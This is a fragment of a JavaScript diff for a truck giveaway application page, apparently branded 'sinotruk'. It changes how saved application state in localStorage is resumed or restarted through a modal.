     document.querySelectorAll('.footer-nav-link').forEach(link => { link.addEventListener('click', (e) => { e.preventDefault(); const target = link.getAttribute('data-target'); if (target === 'giveaway') document.querySelector('.countdown-box')?.scrollIntoView({ behavior: 'smooth' }); else if (target === 'info') document.getElementById('info-section')?.scrollIntoView({ behavior: 'smooth' }); else if (target === 'instruction') document.getElementById('instruction-section')?.scrollIntoView({ behavior: 'smooth' }); else if (target === 'transactions') document.getElementById('transactions-section')?.scrollIntoView({ behavior: 'smooth' }); }); });
     document.getElementById('mobileMenuBtn')?.addEventListener('click', () => { document.getElementById('navLinks').classList.toggle('show'); });
 
-    if (localStorage.getItem('sinotruk_step1_completed') === 'true') { 
-        claimData = JSON.parse(localStorage.getItem('sinotruk_claimData')); 
-        selectedTruck = JSON.parse(localStorage.getItem('sinotruk_selectedTruck')); 
-        saveNotification('Application Previously Submitted', `${selectedTruck.name}, Qty: ${claimData.quantity}, Total 30% Down: ${claimData.totalUpfront}`, true, 2); 
-        if (localStorage.getItem('sinotruk_step2_completed') !== 'true') { 
+    // Check for any incomplete applications on page load
+    if (applications.length > 0) {
+        const incompleteApp = applications.find(a => a.step1Completed && !a.step2Completed);
+        if (incompleteApp) {
             document.getElementById('resumeModal').style.display = 'flex';
-        } else { 
-            businessData = JSON.parse(localStorage.getItem('sinotruk_businessData')); 
-            saveNotification('Business Details Previously Submitted', `${businessData.businessName || 'Individual'}, ${businessData.paymentTerms} payments`, true, 3); 
-            setTimeout(() => { showSuccess(); }, 500); 
-        } 
+            document.getElementById('resumeContinueBtn').onclick = () => {
+                claimData = incompleteApp.claimData;
+                selectedTruck = incompleteApp.selectedTruck;
+                currentAppId = incompleteApp.id;
+                document.getElementById('resumeModal').style.display = 'none';
+                showBusinessModal();
+            };
+            document.getElementById('resumeRestartBtn').onclick = () => {
+                applications = applications.filter(a => a.id !== incompleteApp.id);
+                localStorage.setItem('sinotruk_applications', JSON.stringify(applications));
+                document.getElementById('resumeModal').style.display = 'none';
+            };
+        }
     }
+    
     updateBell();
     renderTrucks();
 </script>
